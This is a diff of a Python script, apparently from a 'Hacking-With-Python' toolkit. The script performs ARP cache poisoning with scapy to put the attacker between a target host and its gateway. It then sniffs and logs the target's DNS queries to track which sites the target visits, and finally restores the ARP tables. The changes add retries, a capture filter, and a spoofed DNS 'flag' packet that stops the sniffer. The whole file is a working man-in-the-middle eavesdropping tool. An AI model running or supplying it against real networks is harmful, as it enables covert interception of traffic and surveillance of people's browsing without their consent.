@@ -1,9 +1,8 @@
 #!/usr/bin/env python
 # -*- coding: utf-8 -*-
 
-# https://medium.com/@ismailakkila/black-hat-python-arp-cache-poisoning-with-scapy-7cb1d8b9d242
 
-from scapy.all import *
+from scapy.all import *                     # external package
 from common_utils import menu_utils
 import os
 import signal
@@ -14,10 +13,12 @@ import time
 
 
 # Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should receive an ARP reply with MAC Address
-def get_mac(network_iface, ip_address):
-    resp, unans = sr(ARP(op=1, pdst=ip_address), iface=network_iface, verbose=False, timeout=100)
-    for s, r in resp:
-        return r[ARP].hwsrc
+def _get_mac(network_iface, ip_address, retries):
+
+    for i in range(0, retries):
+        resp, unans = sr(ARP(op=1, pdst=ip_address), iface=network_iface, verbose=False, timeout=5)
+        for s, r in resp:
+            return r[ARP].hwsrc
     return None
 
 
@@ -33,7 +34,7 @@ def _arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
 
 
 # Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with correct MAC and IP Address info
-def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
+def _restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     menu_utils.highlighted_info("Reestablishing ARP cache")
 
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), verbose=False,
@@ -41,31 +42,34 @@ def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
     send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), verbose=False,
          count=10)
     menu_utils.highlighted_info("Disabling IP forwarding")
+
+    flag_pkt = IP(src=target_ip, dst='8.8.8.8')/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname='flag.flag'))    # flag packet to
+    send(flag_pkt, verbose=0)                                                                     # trigger stop_filter
+
     # Disable IP Forwarding on a mac
     os.system("sysctl -w net.inet.ip.forwarding=0")
 
 
 def _target_dns_sniffer(pkt):
 
-    if IP in pkt:
-        if pkt[IP].src == t_ip:             # only sniffing the DNS packets of the target
-            if pkt.haslayer(DNS):
-                if pkt.getlayer(DNS).qr == 0:
-                    domain = str(pkt.getlayer(DNS).qd.qname)
-                    if domain not in domain_list:
-                        domain_list[domain] = 1
-                        print("%s -> %s: %s" % (pkt[IP].src, pkt[IP].dst, domain))
-                    else:
-                        domain_list[domain] += 1
+    if 'DNS' in pkt:
+        if pkt[DNS].qr == 0:
+            domain = str(pkt[DNS].qd.qname)
+            if domain not in domain_list:
+                domain_list[domain] = 1
+                if "www." in domain:
+                    menu_utils.highlighted_info("%s -> %s: %s" % (pkt[IP].src, pkt[IP].dst, domain))
+                else:
+                    print("%s -> %s: %s" % (pkt[IP].src, pkt[IP].dst, domain))
+            else:
+                domain_list[domain] += 1
 
 
 def _stop_dns_sniffer(pkt):  # this will stop the sniffer
 
-    if ARP in pkt:       # only filtering ARP sent from host
-        if pkt[ARP].op == 2:
-            if (pkt[ARP].pdst == t_ip) & (pkt[ARP].hwdst == "ff:ff:ff:ff:ff:ff") & (pkt[ARP].psrc == g_ip) & \
-                    (pkt[ARP].hwsrc == g_mac):
-                menu_utils.super_highlighted_info("Stopping the sniffer")
+    if 'DNS' in pkt:
+        if pkt[IP].dst == "8.8.8.8":
+            if (pkt[DNS].rd == 1) & ("flag.flag" in str(pkt[DNS].qd.qname)):
                 return True
 
     return False
@@ -80,16 +84,15 @@ def _keyboard_interrupt_handler(signal, frame):
         exit()
     else:
         poison_thread.join()
-        restore_network(g_ip, g_mac, t_ip, t_mac)
+        _restore_network(g_ip, g_mac, t_ip, t_mac)
     return None
 
 
 def _main_keyboard_interrupt_handler(signal, frame):
-    menu_utils.super_highlighted_info("\n\nThanks for using Hacking-With-Python, see you soon !\n")
-    exit()
+    menu_utils.see_you_soon()
 
 
-def navigation_eavesdropping_attack(network_iface, target_ip, gateway_ip):
+def mitm_attack(network_iface, target_ip, gateway_ip):
 
     global h_mac, t_ip, g_ip, t_mac, g_mac, continue_poison, domain_list, poison_thread
     h_mac = get_if_hwaddr(network_iface)
@@ -102,19 +105,20 @@ def navigation_eavesdropping_attack(network_iface, target_ip, gateway_ip):
     signal.signal(signal.SIGINT, _keyboard_interrupt_handler)
 
     menu_utils.header('Navigation eavesdropping attack, target IP: %s ' % target_ip)
+
     menu_utils.mixed_info("Network interface: ", network_iface)
     menu_utils.mixed_info("Gateway IP: ", gateway_ip)
 
     menu_utils.header("Stage 1: Poisoning ARP")
 
-    t_mac = get_mac(network_iface, t_ip)
+    t_mac = _get_mac(network_iface, t_ip, 10)
     if t_mac is None:
         menu_utils.warning("Unable to get target MAC address")
         return None
     else:
         menu_utils.mixed_info("Target MAC address: ", t_mac)
 
-    g_mac = get_mac(network_iface, g_ip)
+    g_mac = _get_mac(network_iface, g_ip, 10)
     if g_mac is None:
         menu_utils.warning("Unable to get gateway MAC address")
         return None
@@ -129,7 +133,9 @@ def navigation_eavesdropping_attack(network_iface, target_ip, gateway_ip):
     poison_thread = threading.Thread(target=_arp_poison, args=(g_ip, g_mac, t_ip, t_mac))
     poison_thread.start()
 
-    # Sniff traffic
+    # Sniff DNS traffic
+    bpf_filter = f"udp port 53 and ip src {target_ip}"
     menu_utils.header("Stage 2: Eavesdropping target DNS traffic")
-    sniff(iface=network_iface, prn=_target_dns_sniffer, stop_filter=_stop_dns_sniffer, store=0)
+    sniff(iface=network_iface, filter=bpf_filter, prn=_target_dns_sniffer, stop_filter=_stop_dns_sniffer, store=0)
+
     signal.signal(signal.SIGINT, _main_keyboard_interrupt_handler)
